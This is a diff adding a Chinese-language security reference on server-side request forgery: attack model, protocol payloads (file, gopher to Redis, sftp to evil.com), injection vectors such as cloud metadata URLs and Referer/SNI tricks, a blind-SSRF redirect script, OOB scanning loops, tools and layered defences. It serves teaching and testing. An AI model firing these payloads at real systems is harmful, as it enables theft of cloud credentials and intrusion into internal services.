@@ -1,0 +1,360 @@
+---
+attack_surface: [协议解析差异, 编码/序列化滥用, 客户端利用, 配置缺陷]
+impact: [信息泄露, 机密性破坏, 权限提升, 远程代码执行]
+risk_level: 严重
+prerequisites:
+  - HTTP 协议与请求构造
+  - URL 解析基础
+  - 云服务基础概念
+difficulty: 中级
+related_techniques:
+  - open-redirect
+  - url-format-bypass
+  - dns-rebinding-attacks
+  - crlf-injection
+  - xss-cross-site-scripting
+  - file-inclusion
+tools:
+  - curl
+  - Burp Collaborator / interactsh
+  - SSRFMap
+  - Gopherus
+  - Singularity
+---
+
+# SSRF (Server-Side Request Forgery) 深度解析与实战利用指南
+
+---
+
+# 0x01 背景与原理
+
+## 1.1 定义
+
+**Server-Side Request Forgery (SSRF)** 是指攻击者操控**服务端应用程序**以服务器的身份向任意目标发起 HTTP 请求。与 CSRF (客户端伪造请求) 不同，SSRF 的请求**源 IP 是服务器自身**，因此可以访问：
+
+- 外网无法直达的**内网服务** (如内部 API、数据库、管理面板)
+- 云平台的**元数据端点** (`169.254.169.254`)
+- 仅限本机访问的**回环服务** (如 Docker Socket、Redis、Memcache)
+
+## 1.2 攻击模型
+
+```mermaid
+graph LR
+    A[攻击者] -->|可控 URL 参数| B[受害 Web 服务器]
+    B -->|以服务器身份发起请求| C[内网/本机 目标服务]
+    C -->|响应数据| B
+    B -->|可能回显给攻击者| A
+```
+
+**关键特征**：
+- 攻击者的请求**不直接到达目标**，而是经过受害服务器"代理"
+- 攻击者可控制目标 URL（完整或部分）
+- 服务器端的网络可达性决定了 SSRF 的利用范围
+
+## 1.3 影响等级
+
+| 攻击目标 | 效果 | 风险等级 |
+|----------|------|----------|
+| 云元数据端点 | 获取 IAM 临时凭据 → 云账户接管 | **严重** |
+| 内部 API/管理面板 | 未授权操作、数据窃取 | **高** |
+| 回环服务 (Redis/Memcache/MySQL) | 通过 Gopher 协议实现 RCE | **严重** |
+| 端口扫描 | 内网拓扑测绘 | **中** |
+| `file://` 协议 | 服务器文件读取 | **高** |
+| DoS | 大文件下载耗尽连接池 | **低** |
+
+---
+
+# 0x02 URL 白名单绕过
+
+SSRF 的入口通常受限于"只允许某些域名/IP"的白名单。URL 校验绕过的完整技术矩阵（localhost 表示变形、Domain 解析混淆、反斜杠陷阱、DNS Rebinding、近期 CVE 实例）已整理在独立文档中，便于与 Open Redirect 等其他攻击面交叉引用：
+
+> **参见 [URL Format Bypass](./URL%20Format%20Bypass.md)** — 16 类绕过技术 × 120+ Payload × 7 个 CVE 案例
+
+---
+
+# 0x03 协议攻击面
+
+## 3.1 协议矩阵
+
+| 协议 | 用途 | 风险等级 | 示例 |
+|------|------|----------|------|
+| `file://` | 读取本地文件 | **高** | `file:///etc/passwd` |
+| `dict://` | 与 TCP 端口交互 | 中 | `dict://127.0.0.1:11211/stats` |
+| `gopher://` | **构造任意 TCP 数据流** | **严重** | `gopher://127.0.0.1:6379/_*1%0d%0a$8...` |
+| `sftp://` | SFTP 连接 | 中 | `sftp://evil.com:11111/` |
+| `tftp://` | TFTP (UDP) | 中 | `tftp://evil.com:12346/TEST` |
+| `ldap://` | LDAP 目录服务 | 中 | `ldap://127.0.0.1:11211/%0astats%0aquit` |
+
+## 3.2 Gopher 协议深度利用
+
+Gopher 协议允许攻击者**自定义 TCP 数据流的每一个字节**，使 SSRF 可以直接与任何 TCP 服务（Redis、MySQL、SMTP、FastCGI）通信，无需理解协议细节——只需知道该协议的标准请求格式。
+
+```bash
+# Gopher HTTP GET
+gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
+
+# Gopher HTTP POST
+gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
+
+# Gopher SMTP (发送邮件)
+gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A...
+
+# Gopher Redis (写入 SSH key / crontab)
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0a...
+
+# Gopher MongoDB (创建管理员)
+gopher://0.0.0.0:27017/_<BSON payload>
+```
+
+**工具辅助**：
+
+- [Gopherus](https://github.com/tarunkant/Gopherus) — 针对 MySQL、PostgreSQL、FastCGI、Redis、Zabbix、Memcache 的 Gopher Payload 自动生成
+- [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) — Java RMI + SSRF → Gopher Payload
+
+---
+
+# 0x04 攻击向量全集
+
+## 4.1 直接 URL 参数注入
+
+最常见的 SSRF 入口：服务端通过 `url=` 参数获取资源（图片代理、网页预览、Webhook、PDF 生成等）。
+
+```bash
+# 常见注入参数
+?url=http://169.254.169.254/latest/meta-data/
+?path=http://127.0.0.1:8080/admin
+?file=http://internal-api/v1/users
+?src=http://10.0.0.5/debug
+```
+
+## 4.2 Referer 头 SSRF
+
+分析/统计型后端代码会记录 `Referer` 头并**访问 Referer URL** 以获取来源站点的内容分析和摘要。此行为在分析平台中极为普遍。
+
+```http
+GET / HTTP/1.1
+Host: target.com
+Referer: http://169.254.169.254/latest/meta-data/
+```
+
+> **工具**：Burp 插件 **Collaborator Everywhere** 自动在请求中嵌入 Collaborator URL，检测服务端是否对外部 URL 发起请求。
+
+## 4.3 SNI 数据 SSRF
+
+当反向代理（如 NGINX）在 `stream` 模块中使用 `$ssl_preread_server_name` 直接作为 `proxy_pass` 目标时，客户端的 SNI 字段完全控制出站连接目标：
+
+```nginx
+stream {
+    server {
+        listen 443;
+        resolver 127.0.0.11;
+        proxy_pass $ssl_preread_server_name:443;   # ← 直接来自 SNI
+        ssl_preread on;
+    }
+}
+```
+
+```bash
+openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
+```
+
+## 4.4 TLS AIA CA Issuers (Java mTLS SSRF)
+
+Java 在启用 `-Dcom.sun.security.enableAIAcaIssuers=true` 的 mTLS 场景下，会从客户端证书的 **Authority Information Access → CA Issuers URI** 自动下载中间 CA 证书。攻击者可通过伪造客户端证书触发服务端向任意地址发起请求：
+
+```bash
+java -Dcom.sun.security.enableAIAcaIssuers=true \
+     -Dhttp.agent="SSRF PoC" -jar server.jar
+# 攻击者证书 AIA: http://localhost:8080
+# → 服务端在 TLS 握手阶段向 localhost:8080 发起请求
+```
+
+## 4.5 CSS Pre-Processor SSRF (LESS)
+
+LESS CSS 预处理器在遇到 `@import` 语句时默认获取外部资源并内联到编译结果中：
+
+```less
+@import (inline) "http://169.254.169.254/latest/meta-data/";
+```
+
+## 4.6 HTML-PDF 渲染 SSRF (TCPDF/html2pdf)
+
+PDF 生成库会自动解析 HTML 中的外部资源引用：
+
+```html
+<html>
+  <body>
+    <img src="http://127.0.0.1:8080/healthz">
+    <link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin">
+  </body>
+</html>
+```
+
+TCPDF 6.10.0 对每个 `<img>` 发起多次获取尝试，html2pdf 在 `Css::extractStyle()` 中使用 `file_get_contents()` 获取 CSS 外部引用——两者均可被利用为**盲 SSRF 代理**。
+
+## 4.7 绝对 URI 请求行 (Open Forward-Proxy)
+
+部分反向代理接受 HTTP 请求行中的**绝对 URI 形式** (`GET http://10.0.0.5:8080/path HTTP/1.1`) 并直接转发，将其变为**预认证的全读前向代理**：
+
+```http
+GET http://127.0.0.1:8080/ HTTP/1.1
+Host: whatever
+Connection: close
+```
+
+## 4.8 代理路径解析差异
+
+不同框架对 URL 路径的解析差异可导致 SSRF：
+
+| 框架 | 注入方式 | 请求示例 |
+|------|----------|----------|
+| Flask | `@` 作为路径首字符 | `GET @evildomain.com/ HTTP/1.1` |
+| Spring Boot | `;` 作为路径首字符 | `GET ;@evil.com/url HTTP/1.1` |
+| PHP Built-in | `*` 在 `/` 之前 | `GET *@0xa9fea9fe/ HTTP/1.1` |
+
+---
+
+# 0x05 Blind SSRF
+
+## 5.1 定义与挑战
+
+**Blind SSRF** 指攻击者**看不到 SSRF 请求的响应内容**的情况。此时需要依赖侧信道技术——响应时间差异、DNS/HTTP 外带（OOB）、错误消息推断——来判断漏洞存在与否。
+
+## 5.2 盲 SSRF → 全回显：HTTP 重定向循环法
+
+利用**异常的 HTTP 状态码重定向链**，迫使应用进入调试模式并泄露响应内容：
+
+```python
+@app.route("/redir")
+def redir():
+    count = int(request.args.get("count", 0)) + 1
+    weird_status = 301 + count       # 305, 306, 307, 308, 309, 310...
+    if count >= 10:
+        return redirect(METADATA_URL, 302)
+    return redirect(f"/redir?count={count}", weird_status)
+```
+
+**原理**：libcurl 本身会跟随 305–310 状态码；经过 N 次奇怪重定向后，应用的 wrapper 认为"异常"并切换为调试模式，将完整重定向链 + 最终响应体返回给攻击者。
+
+## 5.3 盲 SSRF → 时间侧信道
+
+通过测量服务端响应时间差异判断内网端口/服务是否存在：
+
+- 关闭的端口 → 快速拒绝 → 短响应时间
+- 开放的端口 → 尝试建立连接 → 较长时间
+- 存在特定服务的端口 → 协议交互延时 → 可区分的时间特征
+
+---
+
+# 0x06 DNS Rebinding
+
+## 6.1 绕过 CORS/SOP
+
+当需要从内网 IP **读取响应内容**但受 CORS/SOP 限制时，DNS Rebinding 可使攻击者域名与内网 IP 同源，从而绕过同源策略。
+
+## 6.2 DNS Rebinding + TLS Session ID/Ticket
+
+高级攻击链：
+
+1. 受害者访问攻击者域名 (TTL=0)
+2. 建立 TLS 连接，攻击者将 Payload 注入 Session ID/Ticket
+3. 无限重定向环迫使受害者反复访问该域名
+4. 某次 DNS 解析将域名指向 127.0.0.1
+5. 受害者尝试恢复 TLS 会话时**向 127.0.0.1 发送**包含攻击者 Payload 的 Session Ticket
+
+**工具**：[TLS-poison](https://github.com/jmdx/TLS-poison/)、[Singularity](https://github.com/nccgroup/singularity)
+
+---
+
+# 0x07 检测与挖掘
+
+## 7.1 OOB 检测基础设施
+
+```bash
+# 首选工具列表
+Burp Collaborator          # Burp 内置
+interactsh                 # projectdiscovery 出品
+http://webhook.site        # 临时 HTTP 日志
+http://pingb.in            # 临时 DNS/HTTP 回调
+https://canarytokens.org   # 蜜罐型检测
+http://requestrepo.com     # 请求镜像
+```
+
+## 7.2 自动化扫描
+
+```bash
+# SSRFMap — 检测 + 利用一体化
+ssrfmap -r urls.txt -p url -m readfiles
+
+# 自定义扫描 — 替换参数值为 Collaborator URL
+cat params.txt | while read url; do
+  curl -s "$url=http://YOUR.interactsh.com" &
+done
+```
+
+## 7.3 PHP SSRF 函数
+
+以下 PHP 函数在接收用户输入时可能导致 SSRF：
+
+- `file_get_contents()`
+- `fopen()`
+- `curl_exec()`
+- `readfile()`
+- `get_headers()`
+- WordPress: `wp_remote_get()`, `wp_remote_post()`
+
+---
+
+# 0x08 工具清单
+
+| 工具 | 用途 | 关键特性 |
+|------|------|----------|
+| [SSRFMap](https://github.com/swisskyrepo/SSRFmap) | 检测 + 多协议利用 | 支持 file/gopher/dict 等多种协议 |
+| [Gopherus](https://github.com/tarunkant/Gopherus) | Gopher Payload 生成 | MySQL / PostgreSQL / FastCGI / Redis / Zabbix / Memcache |
+| [Singularity](https://github.com/nccgroup/singularity) | DNS Rebinding 攻击框架 | 自动化 IP 切换 + Payload 下发 |
+| [SSRF Proxy](https://github.com/bcoles/ssrf_proxy) | SSRF → HTTP 代理隧道 | 通过 SSRF 节点转发 HTTP 流量 |
+| [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) | Java RMI SSRF Payload | 自动生成 RMI 操作的 Gopher Payload |
+
+---
+
+# 0x09 分层防御
+
+## 9.1 网络层
+
+- 最小权限出站规则：Web 服务器仅允许必要的出站连接
+- 内网分段：将敏感服务与 Web 层网络隔离
+- 禁用回环到非必要服务：Docker Socket、Redis、元数据端点不应能从 Web 进程访问
+
+## 9.2 应用层
+
+```python
+# 核心防御原则
+BLOCKED_SCHEMES = {"file", "gopher", "dict", "ftp", "sftp", "tftp", "ldap"}
+BLOCKED_HOSTS = {"127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0"}
+ALLOWED_HOSTS = {"api.trusted.com", "cdn.trusted.com"}  # 白名单模式优先
+
+# 关键步骤：
+# 1. 协议白名单
+# 2. DNS 解析 → IP 校验
+# 3. 重定向跟随后再次校验
+# 4. 拒绝 Userinfo (@)
+# 5. 统一 URL 解析器消除差异
+```
+
+## 9.3 云平台
+
+- 启用 IMDSv2 (AWS) / `Metadata-Flavor` 验证 (GCP) / `Metadata: true` (Azure)
+- 限制 metadata endpoint 的 hop limit (AWS IMDSv2 默认为 1)
+- 非必要不挂载 IAM Role 到 EC2/ECS/EKS
+- 监控对 `169.254.169.254` 的异常请求
+
+---
+
+# 0x0A 参考资料
+
+- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
+- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [Assetnote — Blind SSRF Chains](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)
+- [Exploiting HTTP Parsers Inconsistencies (Flask/Spring/PHP built-in server)](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
+- [Gopherus Blog Post](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
+- [Singularity — DNS Rebinding Framework](https://github.com/nccgroup/singularity)
